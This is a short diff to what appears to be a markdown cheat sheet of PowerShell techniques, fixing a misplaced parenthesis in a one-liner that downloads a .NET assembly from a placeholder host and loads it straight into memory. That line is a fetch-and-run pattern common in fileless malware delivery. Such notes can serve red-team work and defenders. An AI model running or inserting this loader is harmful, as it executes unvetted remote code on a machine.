@@ -9,7 +9,7 @@
 
 ### HTTP(S) URL
 ```powershell
-[System.Reflection.Assembly]::Load((Invoke-WebRequest '<http(s)>://<host>:<port>/<uri>')).Content
+[System.Reflection.Assembly]::Load((Invoke-WebRequest '<http(s)>://<host>:<port>/<uri>').Content)
 ```
 
 ### Base64
